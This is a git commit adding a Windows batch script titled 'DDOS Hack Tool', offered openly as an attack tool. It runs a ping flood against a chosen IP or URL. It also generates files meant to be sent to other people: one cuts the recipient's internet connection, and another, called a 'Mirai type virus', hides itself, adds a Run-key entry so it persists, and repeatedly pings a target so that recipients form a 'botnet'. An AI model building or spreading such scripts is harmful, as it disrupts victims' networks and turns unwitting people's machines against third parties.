5854d525d46787d36a4cd63ebd170cfa0977f323
Sharafat Ali <132651246+SHARAFATY@users.noreply.github.com>
2025-10-23 19:04:46 +0500

    Add files via upload

---
+++ DDOS Tool/code.bat
@@ -0,0 +1,372 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWHreyHcjLQlHcAyLL2O7OpoS7czp5vyCnmkYR+krd5/n972AJdwyzn/UNcR9lllVldsACQMWbQu4Dg==
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFBNdXwyDAE+1EbsQ5+n//NaPo04WXew4R4zUyKabMPQa5UvbfJUi2EUIyp1cVUIWdxGkDg==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF25
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF25
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJjZksaH0rTXA==
+::ZQ05rAF9IBncCkqN+0xwdVsHAlTMbyXoZg==
+::ZQ05rAF9IAHYFVzEqQIUDDRnDDCtE0fa
+::eg0/rx1wNQPfEVWB+kM9LVsJDCCmE1j6DrQf4+H16KqzrUIRNA==
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQIYKRhfRQqFfH+1Cblc/fvy4e3HoEwJV+p/S4zJ06SaQA==
+::dhA7uBVwLU+EWGiR/UE7OxJYWgGQcWe7BNU=
+::YQ03rBFzNR3SWATExVc5KxBnRQiUOXna
+::dhAmsQZ3MwfNWATExVc5KxBHRQiUOXn3CrQeiA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRmh+kg/MVo0
+::Zh4grVQjdCyDJGyX8VAjFBNdXwyDAES0A5EO4f7+086CsUYJW/IDVYbV34iqBM8gqnHreppj02Jf+A==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+title DDOS Hack Tool
+color a
+cd SystemDDOS >nul 2>nul
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc0) >nul
+goto Inicio
+
+:Error0x0cc0
+cls
+color f
+echo(
+echo( DDOS Hack Tool has not started because the following file is missing or is
+echo( Corrupt: [-Location-]\SystemDDOS\ADZP 20 Complex.sys
+echo( Reinstall a Copy of the Mentioned File
+pause >nul
+exit
+
+:Error0x0cc20
+cls
+timeout /t 2 >nul
+color f
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo                                                           !
+echo.
+echo                                      The Program Has Closed Due to an Error
+echo.
+pause >nul
+exit
+
+:Inicio
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+color a
+echo(
+echo(
+echo(              ==========================================================================================
+echo(                                DDOS Hack Tool                                                          
+echo(              =================================================== 1 = Attack on a web page              
+echo(                        Welcome, To this Tool                     2 = Disconnecting from the Internet   
+echo(                        You can perform DDOS attacks on an            a Device                          
+echo(                        Server with a maximum of 65500            3 = More Features of the Application  
+echo(                        Bytes per Second.                                                               
+echo(              ==========================================================================================
+set /p id=" *             Ingrese la ID: "
+if %id% == 1 (goto DDOS)
+if %id% == 2 (goto EthernetKiller)
+if %id% == 3 (goto More)
+
+:IDError1
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+msg * La ID no es Valida
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto Inicio
+
+:DDOS
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+echo.
+echo.
+set /p ip= Enter the IP or URL of the website you want to attack: 
+echo.
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+set /p bytes= Enter the Number of Bits You Want to Attack the Web With:
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+echo. ===============================
+echo.  Preparing DDOS Attack...      
+echo. ===============================
+timeout /t 3 >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.  Preparing Packages...         
+echo. ===============================
+timeout /t 3 >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.  Connecting to Server...       
+echo. ===============================
+timeout /t 3 >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+ping %ip% -n 1 >nul
+IF NOT ERRORLEVEL 1 (GOTO ATTACK) else (GOTO ERROR0X0CC18) >nul
+
+:Attack
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echor ======================================================
+echo. Attacking %ip%...
+echo ======================================================
+echo. To Stop Processes Attacking the Address
+echo. Press Control + C and All Processes of the
+echo. DDOS Attack on the URL or IP will be Stopped
+echo ====================================================
+ping %ip% -t -l %bytes%
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto Inicio
+
+:Error0x0cc18
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo.
+echo.                                   =============================================
+echo.                                     Cannot Establish Connection to Power       
+echo.                                     Performing the DDOS Attack                 
+echo.                                   =============================================
+echo.                                               Check the following              
+echo.                                   =============================================
+echo.                                    * If there is Internet connection           
+echo.                                   =============================================
+echo.                                    * That a Firewall is not Blocking the       
+echo.                                      Conexion a Internet                       
+echo.                                   =============================================
+echo.                                    * That the IP or URL is Correct             
+echo.                                      Writings                                  
+echo.                                   =============================================
+pause >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto Inicio
+
+
+:EthernetKiller
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo.
+echo.
+echo.
+echo.
+set /p name= Before creating the file, enter the name you want to assign to it:
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo @echo off>>%name%.bat
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v EthernetKiller /t REG_SZ /d "%name%.bat"
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo Ipconfig /release>>%name%.bat
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.    A File Has Just Been Created That Kills Your Internet, You Can Send This File To Someone To Kill Their Connection
+echo.                                                  to Internet
+pause >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto Inicio
+
+:More
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo(
+echo(
+echo(                ========================================================================================
+echo(                                 DDOS Hack Tool                                                         
+echo(                =============================================== 1 = View Network Configuration          
+echo(                       These are some of the functions          2 = Troubleshooting Connection Problems 
+echo(                       of the Additional Functions of the       3 = Cancel Internet Connection           
+echo(                       Application to be able to solve          4 = Create Mirai Type Virus              
+echo(                       Connection Problems and Facilitate       5 = Information about networks          
+echo(                       Hacking on the Networks both Networks    6 = Back to Home                        
+echo(                       You publish as Private Networks.                                                 
+echo(                ========================================================================================
+set /p opcion=" *               Ingrese la ID: "
+if %opcion% == 1 (goto Settings)
+if %opcion% == 2 (goto Repair)
+if %opcion% == 3 (goto EthernetKill)
+if %opcion% == 4 (goto Mirai)
+if %opcion% == 5 (goto EthernetSpy)
+if %opcion% == 6 (goto Inicio)
+
+:IDError2
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+msg * The ID is not valid
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto More
+
+:Settings
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+echo.
+ipconfig
+pause >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto More
+
+:Repair
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo.
+echo.
+echo                  ================================================================================
+echo                     Troubleshooting Connection Problems                                          
+echo                  ========================================= 1 = Fix Internet Connection           
+echo                    If your Internet connection is not      2 = Restart Internet Connection       
+echo                    working You can use the Repair System   3 = Back to Home                      
+echo                    from the Internet to Restore                                                  
+echo                  ================================================================================
+set /p repair=" *                Ingrese la ID: "
+if %repair% == 1 (goto EthernetRepair)
+if %repair% == 2 (goto EthernetReset)
+if %repair% == 3 (goto More)
+
+:IDError3
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+msg * The ID is not valid
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto More
+
+:EthernetRepair
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.                                        Repairing Internet Connection...
+timeout /t 5 >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo.
+echo.
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+ipconfig /renew
+pause >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto More
+
+:EthernetReset
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+ipconfig /release >nul
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.                                       Restarting Internet Connection...
+timeout /t 5 >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo.
+echo.
+ipconfig /renew
+pause >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto Repair
+
+:EthernetKill
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo.
+echo.
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+ipconfig /release
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+msg * Internet Connection Has Been Cancelled
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+pause >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto More
+
+:Mirai
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+echo.
+echo.
+set /p name=" Enter the Name you want to assign to the file: "
+echo.
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+set /p ip= Enter the IP or URL of the website you want to attack:
+echo.
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+set /p bytes= Enter the Amount of Bytes You Want to Attack the Web With:
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+if exist %name%.bat (del /f /q /s %name%.bat & RunDll32 "ADZP 20 Complex.sys") else (echo.)
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+if exist DDOS-Autorun.inf (del /f /q /s DDOS-Aurorun.inf & RunDll32 "ADZP 20 Complex.sys")
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo off>>"%name%".bat
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo @echo off>>"%name%.bat"
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v DDOS /t REG_SZ /d "%name%.bat">>%name%.bat
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo attrib +h "%name%.bat">>"%name%.bat"
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo ping %ip% -t -l %bytes%>>"%name%.bat"
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo off>>DDOS-Autorun.inf
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo [Autorun]>>DDOS-Autorun.inf
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo Open=%name%.bat>>DDOS-Autorun.inf
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo Action=Start %name%>>DDOS-Autorun.inf
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+cls
+echo.
+echo.
+echo.
+echo.
+echo.
+echo.         2 Files Just Created That Execute DDOS Attacks, You Can Send These Files To Multiple People For
+echo.                                  Create a Botnet that Attacks the Specified IP
+pause >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto More
+
+:EthernetSpy
+cls
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+echo.
+echo.
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+netsh wlan show profile
+pause >nul
+if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
+goto More
